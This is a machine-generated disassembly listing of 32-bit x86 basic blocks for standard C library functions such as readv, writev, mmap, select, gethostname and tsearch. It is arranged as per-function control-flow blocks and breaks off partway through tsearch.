0xb0e1527:	test	eax, eax
0xb0e1529:	mov	dword ptr [ecx + 0xc], edx
0xb0e152c:	jne	0xb0e15b8
None
|
|
|
v
0xb0e15b2:	pop	ebx
0xb0e15b3:	pop	esi
0xb0e15b4:	pop	edi
0xb0e15b5:	ret	
None
|
|
|
v
0xb0e14fc:	add	ebx, 0xc9b04
0xb0e1502:	mov	ecx, dword ptr [esp + 0x18]
0xb0e1506:	cmp	dword ptr [esp + 0x10], 3
0xb0e150b:	jne	0xb0e15d8
None
|
|
|
v
0xb0e156a:	mov	eax, dword ptr [esi + 0x34]
0xb0e156d:	mov	edi, dword ptr [esi + 0x3c]
0xb0e1570:	mov	dword ptr [ecx + 0x30], eax
0xb0e1573:	mov	eax, dword ptr [esi + 0x38]
0xb0e1576:	cdq	
0xb0e1577:	cmp	edi, edx
0xb0e1579:	mov	dword ptr [ecx + 0x34], eax
0xb0e157c:	jne	0xb0e15b8
None
|
|
|
v
0xb0e157e:	mov	eax, dword ptr [esi + 0x40]
0xb0e1581:	mov	dword ptr [ecx + 0x38], eax
0xb0e1584:	mov	eax, dword ptr [esi + 0x44]
0xb0e1587:	mov	dword ptr [ecx + 0x3c], eax
0xb0e158a:	mov	eax, dword ptr [esi + 0x48]
0xb0e158d:	mov	dword ptr [ecx + 0x40], eax
0xb0e1590:	mov	eax, dword ptr [esi + 0x4c]
0xb0e1593:	mov	dword ptr [ecx + 0x44], eax
0xb0e1596:	mov	eax, dword ptr [esi + 0x50]
0xb0e1599:	mov	dword ptr [ecx + 0x48], eax
0xb0e159c:	mov	eax, dword ptr [esi + 0x54]
0xb0e159f:	mov	dword ptr [ecx + 0x50], 0
0xb0e15a6:	mov	dword ptr [ecx + 0x54], 0
0xb0e15ad:	mov	dword ptr [ecx + 0x4c], eax
0xb0e15b0:	xor	eax, eax
0xb0e15b2:	pop	ebx
0xb0e15b3:	pop	esi
0xb0e15b4:	pop	edi
0xb0e15b5:	ret	
None
|
|
|
v
0xb0e14f0:	push	edi
0xb0e14f1:	push	esi
0xb0e14f2:	push	ebx
0xb0e14f3:	mov	esi, dword ptr [esp + 0x14]
0xb0e14f7:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:getrlimit
TOTAL BLOCKS :5
0xb0e2960:	mov	edx, ebx
0xb0e2962:	mov	ecx, dword ptr [esp + 8]
0xb0e2966:	mov	ebx, dword ptr [esp + 4]
0xb0e296a:	mov	eax, 0xbf
0xb0e296f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e2976:	mov	ebx, edx
0xb0e2978:	cmp	eax, 0xfffff001
0xb0e297d:	jae	0xb0e2980
None
|
|
|
v
0xb0e2985:	add	ecx, 0xc867b
0xb0e298b:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0e2991:	neg	eax
0xb0e2993:	add	ecx, dword ptr gs:[0]
0xb0e299a:	mov	dword ptr [ecx], eax
0xb0e299c:	or	eax, 0xffffffff
0xb0e299f:	ret	
None
|
|
|
v
0xb0e2980:	call	0xb1267df
None
|
|
|
v
0xb0e297f:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ioctl
TOTAL BLOCKS :5
0xb0e30e0:	push	ebx
0xb0e30e1:	mov	edx, dword ptr [esp + 0x10]
0xb0e30e5:	mov	ecx, dword ptr [esp + 0xc]
0xb0e30e9:	mov	ebx, dword ptr [esp + 8]
0xb0e30ed:	mov	eax, 0x36
0xb0e30f2:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e3107:	add	ecx, 0xc7ef9
0xb0e310d:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0e3113:	neg	eax
0xb0e3115:	add	ecx, dword ptr gs:[0]
0xb0e311c:	mov	dword ptr [ecx], eax
0xb0e311e:	or	eax, 0xffffffff
0xb0e3121:	ret	
None
|
|
|
v
0xb0e30f9:	pop	ebx
0xb0e30fa:	cmp	eax, 0xfffff001
0xb0e30ff:	jae	0xb0e3102
None
|
|
|
v
0xb0e3102:	call	0xb1267df
None
|
|
|
v
0xb0e3101:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:readv
TOTAL BLOCKS :13
0xb0e316f:	mov	esi, eax
0xb0e3171:	add	esp, 0xc
0xb0e3174:	mov	eax, esi
0xb0e3176:	pop	ebx
0xb0e3177:	pop	esi
0xb0e3178:	pop	edi
0xb0e3179:	pop	ebp
0xb0e317a:	ret	
None
|
|
|
v
0xb0e317b:	mov	edx, dword ptr [ebx - 0xdc]
0xb0e3181:	neg	eax
0xb0e3183:	mov	ecx, dword ptr gs:[0]
0xb0e318a:	mov	dword ptr [ecx + edx], eax
0xb0e318d:	or	eax, 0xffffffff
0xb0e3190:	jmp	0xb0e316f
None
|
|
|
v
0xb0e3166:	xchg	ebx, edi
0xb0e3168:	cmp	eax, 0xfffff000
0xb0e316d:	ja	0xb0e317b
None
|
|
|
v
0xb0e31b3:	xchg	ebx, edi
0xb0e31b5:	cmp	eax, 0xfffff000
0xb0e31ba:	ja	0xb0e31c7
None
|
|
|
v
0xb0e313c:	add	ebx, 0xc7ec4
0xb0e3142:	mov	eax, dword ptr gs:[0xc]
0xb0e3148:	test	eax, eax
0xb0e314a:	jne	0xb0e3192
None
|
|
|
v
0xb0e3197:	mov	edi, dword ptr [esp + 0x20]
0xb0e319b:	mov	ecx, dword ptr [esp + 0x24]
0xb0e319f:	mov	edx, dword ptr [esp + 0x28]
0xb0e31a3:	mov	ebp, eax
0xb0e31a5:	xchg	edi, ebx
0xb0e31a7:	mov	eax, 0x91
0xb0e31ac:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e314c:	mov	edi, dword ptr [esp + 0x20]
0xb0e3150:	mov	ecx, dword ptr [esp + 0x24]
0xb0e3154:	mov	edx, dword ptr [esp + 0x28]
0xb0e3158:	xchg	edi, ebx
0xb0e315a:	mov	eax, 0x91
0xb0e315f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e3192:	call	0xb0f9490
None
|
|
|
v
0xb0e31bc:	mov	esi, eax
0xb0e31be:	mov	eax, ebp
0xb0e31c0:	call	0xb0f94f0
None
|
|
|
v
0xb0e3171:	add	esp, 0xc
0xb0e3174:	mov	eax, esi
0xb0e3176:	pop	ebx
0xb0e3177:	pop	esi
0xb0e3178:	pop	edi
0xb0e3179:	pop	ebp
0xb0e317a:	ret	
None
|
|
|
v
0xb0e31c5:	jmp	0xb0e3171
None
|
|
|
v
0xb0e31c7:	mov	edx, dword ptr [ebx - 0xdc]
0xb0e31cd:	neg	eax
0xb0e31cf:	mov	ecx, dword ptr gs:[0]
0xb0e31d6:	mov	dword ptr [ecx + edx], eax
0xb0e31d9:	or	eax, 0xffffffff
0xb0e31dc:	jmp	0xb0e31bc
None
|
|
|
v
0xb0e3130:	push	ebp
0xb0e3131:	push	edi
0xb0e3132:	push	esi
0xb0e3133:	push	ebx
0xb0e3134:	sub	esp, 0xc
0xb0e3137:	call	0xb1267db
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:writev
TOTAL BLOCKS :13
0xb0e3221:	add	esp, 0xc
0xb0e3224:	mov	eax, esi
0xb0e3226:	pop	ebx
0xb0e3227:	pop	esi
0xb0e3228:	pop	edi
0xb0e3229:	pop	ebp
0xb0e322a:	ret	
None
|
|
|
v
0xb0e3275:	jmp	0xb0e3221
None
|
|
|
v
0xb0e3277:	mov	edx, dword ptr [ebx - 0xdc]
0xb0e327d:	neg	eax
0xb0e327f:	mov	ecx, dword ptr gs:[0]
0xb0e3286:	mov	dword ptr [ecx + edx], eax
0xb0e3289:	or	eax, 0xffffffff
0xb0e328c:	jmp	0xb0e326c
None
|
|
|
v
0xb0e31e0:	push	ebp
0xb0e31e1:	push	edi
0xb0e31e2:	push	esi
0xb0e31e3:	push	ebx
0xb0e31e4:	sub	esp, 0xc
0xb0e31e7:	call	0xb1267db
None
|
|
|
v
0xb0e321f:	mov	esi, eax
0xb0e3221:	add	esp, 0xc
0xb0e3224:	mov	eax, esi
0xb0e3226:	pop	ebx
0xb0e3227:	pop	esi
0xb0e3228:	pop	edi
0xb0e3229:	pop	ebp
0xb0e322a:	ret	
None
|
|
|
v
0xb0e322b:	mov	edx, dword ptr [ebx - 0xdc]
0xb0e3231:	neg	eax
0xb0e3233:	mov	ecx, dword ptr gs:[0]
0xb0e323a:	mov	dword ptr [ecx + edx], eax
0xb0e323d:	or	eax, 0xffffffff
0xb0e3240:	jmp	0xb0e321f
None
|
|
|
v
0xb0e3216:	xchg	ebx, edi
0xb0e3218:	cmp	eax, 0xfffff000
0xb0e321d:	ja	0xb0e322b
None
|
|
|
v
0xb0e3263:	xchg	ebx, edi
0xb0e3265:	cmp	eax, 0xfffff000
0xb0e326a:	ja	0xb0e3277
None
|
|
|
v
0xb0e31ec:	add	ebx, 0xc7e14
0xb0e31f2:	mov	eax, dword ptr gs:[0xc]
0xb0e31f8:	test	eax, eax
0xb0e31fa:	jne	0xb0e3242
None
|
|
|
v
0xb0e3247:	mov	edi, dword ptr [esp + 0x20]
0xb0e324b:	mov	ecx, dword ptr [esp + 0x24]
0xb0e324f:	mov	edx, dword ptr [esp + 0x28]
0xb0e3253:	mov	ebp, eax
0xb0e3255:	xchg	edi, ebx
0xb0e3257:	mov	eax, 0x92
0xb0e325c:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e31fc:	mov	edi, dword ptr [esp + 0x20]
0xb0e3200:	mov	ecx, dword ptr [esp + 0x24]
0xb0e3204:	mov	edx, dword ptr [esp + 0x28]
0xb0e3208:	xchg	edi, ebx
0xb0e320a:	mov	eax, 0x92
0xb0e320f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e3242:	call	0xb0f9490
None
|
|
|
v
0xb0e326c:	mov	esi, eax
0xb0e326e:	mov	eax, ebp
0xb0e3270:	call	0xb0f94f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:__getpagesize
TOTAL BLOCKS :7
0xb0e3f30:	push	ebx
0xb0e3f31:	call	0xb1267db
None
|
|
|
v
0xb0e3f86:	add	ebx, 0xc707a
0xb0e3f8c:	sub	esp, 0x28
0xb0e3f8f:	lea	eax, dword ptr [esp + 0x18]
0xb0e3f93:	mov	dword ptr [esp + 4], eax
0xb0e3f97:	mov	dword ptr [esp], 7
0xb0e3f9e:	call	0xb0e2960
None
|
|
|
v
0xb0e3f36:	add	ebx, 0xc70ca
0xb0e3f3c:	sub	esp, 0x18
0xb0e3f3f:	mov	eax, dword ptr [ebx - 0xe0]
0xb0e3f45:	mov	eax, dword ptr [eax + 0x10]
0xb0e3f48:	test	eax, eax
0xb0e3f4a:	je	0xb0e3f51
None
|
|
|
v
0xb0e3f51:	lea	eax, dword ptr [ebx - 0x488ad]
0xb0e3f57:	mov	dword ptr [esp + 0xc], eax
0xb0e3f5b:	lea	eax, dword ptr [ebx - 0x42a84]
0xb0e3f61:	mov	dword ptr [esp + 4], eax
0xb0e3f65:	lea	eax, dword ptr [ebx - 0x42a58]
0xb0e3f6b:	mov	dword ptr [esp + 8], 0x1d
0xb0e3f73:	mov	dword ptr [esp], eax
0xb0e3f76:	call	0xb027820
None
|
|
|
v
0xb0e3f4c:	add	esp, 0x18
0xb0e3f4f:	pop	ebx
0xb0e3f50:	ret	
None
|
|
|
v
0xb0e3f7b:	nop	
0xb0e3f7d:	nop	
0xb0e3f7f:	nop	
0xb0e3f80:	push	ebx
0xb0e3f81:	call	0xb1267db
None
|
|
|
v
0xb0e3fa3:	test	eax, eax
0xb0e3fa5:	mov	eax, 0x100
0xb0e3faa:	cmovns	eax, dword ptr [esp + 0x18]
0xb0e3faf:	add	esp, 0x28
0xb0e3fb2:	pop	ebx
0xb0e3fb3:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:gethostname
TOTAL BLOCKS :9
0xb0e4040:	mov	eax, dword ptr [ebx - 0xdc]
0xb0e4046:	mov	ebp, 0xffffffff
0xb0e404b:	mov	edx, dword ptr gs:[0]
0xb0e4052:	mov	dword ptr [edx + eax], 0x24
0xb0e4059:	jmp	0xb0e4027
None
|
|
|
v
0xb0e4038:	mov	ebp, 0xffffffff
0xb0e403d:	jmp	0xb0e4027
None
|
|
|
v
0xb0e3fe7:	lea	esi, dword ptr [esp + 0x5b]
0xb0e3feb:	mov	dword ptr [esp], esi
0xb0e3fee:	call	0xb07ae80
None
|
|
|
v
0xb0e401e:	cmp	edi, dword ptr [esp + 0x1c4]
0xb0e4025:	ja	0xb0e4040
None
|
|
|
v
0xb0e4027:	add	esp, 0x1ac
0xb0e402d:	mov	eax, ebp
0xb0e402f:	pop	ebx
0xb0e4030:	pop	esi
0xb0e4031:	pop	edi
0xb0e4032:	pop	ebp
0xb0e4033:	ret	
None
|
|
|
v
0xb0e3fe1:	test	eax, eax
0xb0e3fe3:	mov	ebp, eax
0xb0e3fe5:	jne	0xb0e4038
None
|
|
|
v
0xb0e3fc0:	push	ebp
0xb0e3fc1:	push	edi
0xb0e3fc2:	push	esi
0xb0e3fc3:	push	ebx
0xb0e3fc4:	call	0xb1267db
None
|
|
|
v
0xb0e3fc9:	add	ebx, 0xc7037
0xb0e3fcf:	sub	esp, 0x1ac
0xb0e3fd5:	lea	eax, dword ptr [esp + 0x1a]
0xb0e3fd9:	mov	dword ptr [esp], eax
0xb0e3fdc:	call	0xb0b5520
None
|
|
|
v
0xb0e3ff3:	mov	dword ptr [esp + 4], esi
0xb0e3ff7:	lea	edi, dword ptr [eax + 1]
0xb0e3ffa:	mov	eax, edi
0xb0e3ffc:	cmp	edi, dword ptr [esp + 0x1c4]
0xb0e4003:	cmova	eax, dword ptr [esp + 0x1c4]
0xb0e400b:	mov	dword ptr [esp + 8], eax
0xb0e400f:	mov	eax, dword ptr [esp + 0x1c0]
0xb0e4016:	mov	dword ptr [esp], eax
0xb0e4019:	call	0xb07d0b0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:select
TOTAL BLOCKS :13
0xb0e41b7:	call	0xb0f94f0
None
|
|
|
v
0xb0e41b1:	pop	ebx
0xb0e41b2:	pop	esi
0xb0e41b3:	pop	edi
0xb0e41b4:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xb0e4150:	cmp	dword ptr gs:[0xc], 0
0xb0e4158:	jne	0xb0e4188
None
|
|
|
v
0xb0e41b4:	xchg	dword ptr [esp], eax
None
|
|
|
v
0xb0e4187:	ret	
None
|
|
|
v
0xb0e415a:	push	edi
0xb0e415b:	push	esi
0xb0e415c:	push	ebx
0xb0e415d:	mov	edi, dword ptr [esp + 0x20]
0xb0e4161:	mov	esi, dword ptr [esp + 0x1c]
0xb0e4165:	mov	edx, dword ptr [esp + 0x18]
0xb0e4169:	mov	ecx, dword ptr [esp + 0x14]
0xb0e416d:	mov	ebx, dword ptr [esp + 0x10]
0xb0e4171:	mov	eax, 0x8e
0xb0e4176:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e418d:	push	eax
0xb0e418e:	push	edi
0xb0e418f:	push	esi
0xb0e4190:	push	ebx
0xb0e4191:	mov	edi, dword ptr [esp + 0x24]
0xb0e4195:	mov	esi, dword ptr [esp + 0x20]
0xb0e4199:	mov	edx, dword ptr [esp + 0x1c]
0xb0e419d:	mov	ecx, dword ptr [esp + 0x18]
0xb0e41a1:	mov	ebx, dword ptr [esp + 0x14]
0xb0e41a5:	mov	eax, 0x8e
0xb0e41aa:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e417d:	pop	ebx
0xb0e417e:	pop	esi
0xb0e417f:	pop	edi
0xb0e4180:	cmp	eax, 0xfffff001
0xb0e4185:	jae	0xb0e41c5
None
|
|
|
v
0xb0e41bc:	pop	eax
0xb0e41bd:	cmp	eax, 0xfffff001
0xb0e41c2:	jae	0xb0e41c5
None
|
|
|
v
0xb0e41ca:	add	ecx, 0xc6e36
0xb0e41d0:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0e41d6:	neg	eax
0xb0e41d8:	add	ecx, dword ptr gs:[0]
0xb0e41df:	mov	dword ptr [ecx], eax
0xb0e41e1:	or	eax, 0xffffffff
0xb0e41e4:	ret	
None
|
|
|
v
0xb0e41c4:	ret	
None
|
|
|
v
0xb0e4188:	call	0xb0f9490
None
|
|
|
v
0xb0e41c5:	call	0xb1267df
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:mmap
TOTAL BLOCKS :6
0xb0e7369:	add	ecx, 0xc3c97
0xb0e736f:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0e7375:	neg	eax
0xb0e7377:	add	ecx, dword ptr gs:[0]
0xb0e737e:	mov	dword ptr [ecx], eax
0xb0e7380:	or	eax, 0xffffffff
0xb0e7383:	ret	
None
|
|
|
v
0xb0e7349:	shr	ebp, 0xc
0xb0e734c:	mov	eax, 0xc0
0xb0e7351:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e7364:	call	0xb1267df
None
|
|
|
v
0xb0e7363:	ret	
None
|
|
|
v
0xb0e7320:	push	ebp
0xb0e7321:	push	ebx
0xb0e7322:	push	esi
0xb0e7323:	push	edi
0xb0e7324:	mov	ebx, dword ptr [esp + 0x14]
0xb0e7328:	mov	ecx, dword ptr [esp + 0x18]
0xb0e732c:	mov	edx, dword ptr [esp + 0x1c]
0xb0e7330:	mov	esi, dword ptr [esp + 0x20]
0xb0e7334:	mov	edi, dword ptr [esp + 0x24]
0xb0e7338:	mov	ebp, dword ptr [esp + 0x28]
0xb0e733c:	test	ebp, 0xfff
0xb0e7342:	mov	eax, 0xffffffea
0xb0e7347:	jne	0xb0e7358
None
|
|
|
v
0xb0e7358:	pop	edi
0xb0e7359:	pop	esi
0xb0e735a:	pop	ebx
0xb0e735b:	pop	ebp
0xb0e735c:	cmp	eax, 0xfffff000
0xb0e7361:	ja	0xb0e7364
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:munmap
TOTAL BLOCKS :5
0xb0e7410:	mov	edx, ebx
0xb0e7412:	mov	ecx, dword ptr [esp + 8]
0xb0e7416:	mov	ebx, dword ptr [esp + 4]
0xb0e741a:	mov	eax, 0x5b
0xb0e741f:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0e7426:	mov	ebx, edx
0xb0e7428:	cmp	eax, 0xfffff001
0xb0e742d:	jae	0xb0e7430
None
|
|
|
v
0xb0e7435:	add	ecx, 0xc3bcb
0xb0e743b:	mov	ecx, dword ptr [ecx - 0xdc]
0xb0e7441:	neg	eax
0xb0e7443:	add	ecx, dword ptr gs:[0]
0xb0e744a:	mov	dword ptr [ecx], eax
0xb0e744c:	or	eax, 0xffffffff
0xb0e744f:	ret	
None
|
|
|
v
0xb0e7430:	call	0xb1267df
None
|
|
|
v
0xb0e742f:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0e7b40
TOTAL BLOCKS :12
0xb0e7b6b:	lea	ecx, dword ptr [ebp + 1]
0xb0e7b6e:	mov	edx, edi
0xb0e7b70:	call	0xb0e7b40
None
|
|
|
v
0xb0e7b86:	mov	eax, dword ptr [esi + 8]
0xb0e7b89:	test	eax, eax
0xb0e7b8b:	je	0xb0e7b97
None
|
|
|
v
0xb0e7bc8:	jmp	0xb0e7ba8
None
|
|
|
v
0xb0e7bb7:	mov	dword ptr [esp + 8], ecx
0xb0e7bbb:	mov	dword ptr [esp + 4], 3
0xb0e7bc3:	mov	dword ptr [esp], esi
0xb0e7bc6:	call	edi
None
|
|
|
v
0xb0e7b40:	push	ebp
0xb0e7b41:	mov	ebp, ecx
0xb0e7b43:	push	edi
0xb0e7b44:	mov	edi, edx
0xb0e7b46:	push	esi
0xb0e7b47:	mov	esi, eax
0xb0e7b49:	sub	esp, 0x10
0xb0e7b4c:	mov	edx, dword ptr [eax + 4]
0xb0e7b4f:	test	edx, edx
0xb0e7b51:	je	0xb0e7bb0
None
|
|
|
v
0xb0e7b53:	mov	dword ptr [esp + 8], ebp
0xb0e7b57:	mov	dword ptr [esp + 4], 0
0xb0e7b5f:	mov	dword ptr [esp], esi
0xb0e7b62:	call	edi
None
|
|
|
v
0xb0e7b64:	mov	eax, dword ptr [esi + 4]
0xb0e7b67:	test	eax, eax
0xb0e7b69:	je	0xb0e7b75
None
|
|
|
v
0xb0e7b97:	mov	dword ptr [esp + 8], ebp
0xb0e7b9b:	mov	dword ptr [esp + 4], 2
0xb0e7ba3:	mov	dword ptr [esp], esi
0xb0e7ba6:	call	edi
None
|
|
|
v
0xb0e7ba8:	add	esp, 0x10
0xb0e7bab:	pop	esi
0xb0e7bac:	pop	edi
0xb0e7bad:	pop	ebp
0xb0e7bae:	ret	
None
|
|
|
v
0xb0e7b75:	mov	dword ptr [esp + 8], ebp
0xb0e7b79:	mov	dword ptr [esp + 4], 1
0xb0e7b81:	mov	dword ptr [esp], esi
0xb0e7b84:	call	edi
None
|
|
|
v
0xb0e7b8d:	lea	ecx, dword ptr [ebp + 1]
0xb0e7b90:	mov	edx, edi
0xb0e7b92:	call	0xb0e7b40
None
|
|
|
v
0xb0e7bb0:	mov	eax, dword ptr [eax + 8]
0xb0e7bb3:	test	eax, eax
0xb0e7bb5:	jne	0xb0e7b53
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0e7c20
TOTAL BLOCKS :22
0xb0e7c6a:	and	byte ptr [ecx + 0xc], 0xfe
0xb0e7c6e:	test	edx, edx
0xb0e7c70:	je	0xb0e7cf0
None
|
|
|
v
0xb0e7d2d:	mov	edi, dword ptr [esp]
0xb0e7d30:	mov	esi, dword ptr [esp + 4]
0xb0e7d34:	mov	eax, dword ptr [edi + 4]
0xb0e7d37:	mov	dword ptr [esi + 8], eax
0xb0e7d3a:	mov	dword ptr [edi + 4], esi
0xb0e7d3d:	add	esp, 8
0xb0e7d40:	pop	esi
0xb0e7d41:	pop	edi
0xb0e7d42:	pop	ebp
0xb0e7d43:	ret	
None
|
|
|
v
0xb0e7c3c:	mov	esi, dword ptr [eax + 4]
0xb0e7c3f:	test	esi, esi
0xb0e7c41:	je	0xb0e7cf0
None
|
|
|
v
0xb0e7c5f:	and	byte ptr [ecx + 0xc], 0xfe
0xb0e7c63:	mov	ecx, dword ptr [eax + 4]
0xb0e7c66:	test	ecx, ecx
0xb0e7c68:	je	0xb0e7c6e
None
|
|
|
v
0xb0e7c51:	test	byte ptr [esi + 0xc], 1
0xb0e7c55:	je	0xb0e7cf0
None
|
|
|
v
0xb0e7ce3:	mov	edi, dword ptr [esp + 0x18]
0xb0e7ce7:	mov	dword ptr [edi], eax
0xb0e7ce9:	lea	esi, dword ptr [esi]
0xb0e7cf0:	add	esp, 8
0xb0e7cf3:	pop	esi
0xb0e7cf4:	pop	edi
0xb0e7cf5:	pop	ebp
0xb0e7cf6:	ret	
None
|
|
|
v
0xb0e7c20:	push	ebp
0xb0e7c21:	push	edi
0xb0e7c22:	push	esi
0xb0e7c23:	sub	esp, 8
0xb0e7c26:	mov	ecx, dword ptr [eax + 8]
0xb0e7c29:	cmp	dword ptr [esp + 0x24], 1
0xb0e7c2e:	je	0xb0e7cf8
None
|
|
|
v
0xb0e7cca:	mov	esi, dword ptr [eax + 4]
0xb0e7ccd:	mov	edx, dword ptr [esp]
0xb0e7cd0:	mov	dword ptr [edx + 8], esi
0xb0e7cd3:	mov	esi, dword ptr [esp + 4]
0xb0e7cd7:	mov	dword ptr [eax + 4], edx
0xb0e7cda:	mov	edx, dword ptr [eax + 8]
0xb0e7cdd:	mov	dword ptr [esi + 4], edx
0xb0e7ce0:	mov	dword ptr [eax + 8], esi
0xb0e7ce3:	mov	edi, dword ptr [esp + 0x18]
0xb0e7ce7:	mov	dword ptr [edi], eax
0xb0e7ce9:	lea	esi, dword ptr [esi]
0xb0e7cf0:	add	esp, 8
0xb0e7cf3:	pop	esi
0xb0e7cf4:	pop	edi
0xb0e7cf5:	pop	ebp
0xb0e7cf6:	ret	
None
|
|
|
v
0xb0e7d10:	mov	eax, dword ptr [esp + 0x18]
0xb0e7d14:	mov	esi, dword ptr [esp]
0xb0e7d17:	mov	dword ptr [eax], esi
0xb0e7d19:	mov	eax, dword ptr [esp + 4]
0xb0e7d1d:	and	byte ptr [esi + 0xc], 0xfe
0xb0e7d21:	or	byte ptr [eax + 0xc], 1
0xb0e7d25:	mov	eax, dword ptr [esp + 0x1c]
0xb0e7d29:	test	eax, eax
0xb0e7d2b:	js	0xb0e7d60
None
|
|
|
v
0xb0e7c72:	mov	edi, dword ptr [edx]
0xb0e7c74:	movzx	esi, byte ptr [edi + 0xc]
0xb0e7c78:	mov	dword ptr [esp], edi
0xb0e7c7b:	test	esi, 1
0xb0e7c81:	je	0xb0e7cf0
None
|
|
|
v
0xb0e7cab:	mov	edi, dword ptr [esp]
0xb0e7cae:	or	esi, 1
0xb0e7cb1:	mov	edx, esi
0xb0e7cb3:	mov	esi, dword ptr [esp + 4]
0xb0e7cb7:	mov	byte ptr [edi + 0xc], dl
0xb0e7cba:	mov	edx, dword ptr [esp + 0x1c]
0xb0e7cbe:	or	byte ptr [esi + 0xc], 1
0xb0e7cc2:	and	byte ptr [eax + 0xc], 0xfe
0xb0e7cc6:	test	edx, edx
0xb0e7cc8:	js	0xb0e7d48
None
|
|
|
v
0xb0e7d04:	jmp	0xb0e7c63
None
|
|
|
v
0xb0e7c5b:	or	byte ptr [eax + 0xc], 1
0xb0e7c5f:	and	byte ptr [ecx + 0xc], 0xfe
0xb0e7c63:	mov	ecx, dword ptr [eax + 4]
0xb0e7c66:	test	ecx, ecx
0xb0e7c68:	je	0xb0e7c6e
None
|
|
|
v
0xb0e7c34:	test	ecx, ecx
0xb0e7c36:	je	0xb0e7cf0
None
|
|
|
v
0xb0e7c83:	mov	edi, dword ptr [esp + 0x18]
0xb0e7c87:	mov	ecx, dword ptr [esp + 0x1c]
0xb0e7c8b:	mov	edx, dword ptr [edi]
0xb0e7c8d:	mov	edi, dword ptr [esp + 0x20]
0xb0e7c91:	test	ecx, ecx
0xb0e7c93:	setg	cl
0xb0e7c96:	mov	ebp, ecx
0xb0e7c98:	mov	dword ptr [esp + 4], edx
0xb0e7c9c:	test	edi, edi
0xb0e7c9e:	setg	cl
0xb0e7ca1:	mov	edi, ecx
0xb0e7ca3:	mov	ecx, ebp
0xb0e7ca5:	mov	edx, edi
0xb0e7ca7:	cmp	cl, dl
0xb0e7ca9:	je	0xb0e7d10
None
|
|
|
v
0xb0e7cf8:	or	byte ptr [eax + 0xc], 1
0xb0e7cfc:	test	ecx, ecx
0xb0e7cfe:	jne	0xb0e7c5f
None
|
|
|
v
0xb0e7d48:	mov	esi, dword ptr [eax + 8]
0xb0e7d4b:	mov	dword ptr [edi + 4], esi
0xb0e7d4e:	mov	esi, dword ptr [esp + 4]
0xb0e7d52:	mov	edx, dword ptr [eax + 4]
0xb0e7d55:	mov	dword ptr [eax + 8], edi
0xb0e7d58:	mov	dword ptr [esi + 8], edx
0xb0e7d5b:	mov	dword ptr [eax + 4], esi
0xb0e7d5e:	jmp	0xb0e7ce3
None
|
|
|
v
0xb0e7d60:	mov	eax, dword ptr [esi + 8]
0xb0e7d63:	mov	edx, esi
0xb0e7d65:	mov	edi, dword ptr [esp + 4]
0xb0e7d69:	mov	dword ptr [edi + 4], eax
0xb0e7d6c:	mov	dword ptr [edx + 8], edi
0xb0e7d6f:	jmp	0xb0e7cf0
None
|
|
|
v
0xb0e7c6e:	test	edx, edx
0xb0e7c70:	je	0xb0e7cf0
None
|
|
|
v
0xb0e7c47:	test	byte ptr [ecx + 0xc], 1
0xb0e7c4b:	je	0xb0e7cf0
None
|
|
|
v
0xb0e7c63:	mov	ecx, dword ptr [eax + 4]
0xb0e7c66:	test	ecx, ecx
0xb0e7c68:	je	0xb0e7c6e
None
|
|
|
v
0xb0e7cf0:	add	esp, 8
0xb0e7cf3:	pop	esi
0xb0e7cf4:	pop	edi
0xb0e7cf5:	pop	ebp
0xb0e7cf6:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:tsearch
TOTAL BLOCKS :20
0xb0e7dd0:	mov	eax, dword ptr [esi]
0xb0e7dd2:	mov	dword ptr [esp + 4], eax
0xb0e7dd6:	mov	eax, dword ptr [esp + 0x40]
0xb0e7dda:	mov	dword ptr [esp], eax
0xb0e7ddd:	call	dword ptr [esp + 0x48]
None
|
|
|
v
0xb0e7ded:	mov	eax, dword ptr [esp + 0x18]
0xb0e7df1:	mov	dword ptr [esp + 0xc], 0
0xb0e7df9:	mov	edx, dword ptr [esp + 0x10]
0xb0e7dfd:	mov	dword ptr [esp + 4], ebp
0xb0e7e01:	mov	dword ptr [esp + 8], eax
0xb0e7e05:	mov	eax, dword ptr [esp + 0x14]
0xb0e7e09:	mov	dword ptr [esp], eax
0xb0e7e0c:	mov	eax, dword ptr [edi]
0xb0e7e0e:	call	0xb0e7c20
None
|
|
|
v
0xb0e7e44:	mov	eax, ebp
0xb0e7e46:	mov	dword ptr [esp + 0x18], ebp
0xb0e7e4a:	mov	ebp, edi
0xb0e7e4c:	mov	edi, eax
0xb0e7e4e:	mov	ecx, ebp
0xb0e7e50:	mov	dword ptr [esp], 0x10
0xb0e7e57:	mov	dword ptr [esp + 0x14], ecx
0xb0e7e5b:	call	0xb0173f0
None
|
|
|
v
0xb0e7de1:	test	eax, eax
0xb0e7de3:	mov	dword ptr [esp + 0x1c], eax
0xb0e7de7:	je	0xb0e7eac
None
|
|
|
v
